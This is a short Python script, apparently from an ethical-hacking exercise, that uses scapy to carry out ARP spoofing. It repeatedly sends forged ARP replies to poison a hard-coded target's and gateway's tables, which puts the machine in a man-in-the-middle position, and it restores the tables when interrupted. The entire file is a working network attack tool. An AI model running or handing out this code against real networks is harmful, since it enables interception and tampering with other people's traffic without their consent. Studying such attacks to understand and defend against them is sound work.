#!/usr/bin/env python

# Importing modules
import scapy.all as scapy
import time


# Writing a function to scan and get the target mac address
def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast/arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


# Writing a function to create an ARP response
def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    arp_reply = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip) # Creating an arp response
    packet = scapy.Ether(dst=target_mac) / arp_reply
    scapy.sendp(packet, verbose=False)  # send at L2 to avoid the warning

# Writing a function to restore the ARP table
def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    arp_reply = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc= source_mac)
    packet = scapy.Ether(dst=destination_mac) / arp_reply
    scapy.sendp(packet, count=4, verbose=False)


# Using while loop to make the code persistent
target_ip_ip = "192.168.43.88"
gateway_ip = "192.168.43.1"
try:
    sent_packets_count = 0
    while True:
        spoof(target_ip_ip, gateway_ip)
        spoof(gateway_ip, target_ip_ip)
        sent_packets_count += 2
        print(f"\r[+] Packets sent: {sent_packets_count}", end="")
        time.sleep(2)
except KeyboardInterrupt:
    print("\n[-] Detected CTRL + C ... Resetting ARP tables ... Please wait ...\n")
    restore(target_ip_ip, gateway_ip)
    restore(gateway_ip, target_ip_ip)
